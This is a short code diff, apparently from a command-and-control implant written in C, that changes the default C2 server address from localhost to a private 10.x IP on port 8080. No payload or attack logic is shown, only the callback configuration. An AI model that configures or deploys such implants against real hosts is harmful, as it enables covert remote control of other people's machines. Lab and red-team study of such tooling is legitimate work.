@@ -20,7 +20,7 @@
 #endif
 
 // Global C2 server endpoint variables (set from main)
-char C2_SERVER[256] = "127.0.0.1";  // Default value
+char C2_SERVER[256] = "10.49.61.126";  // Default value
 int C2_PORT = 8080;  // Default value
 
 // Function to set C2 server configuration
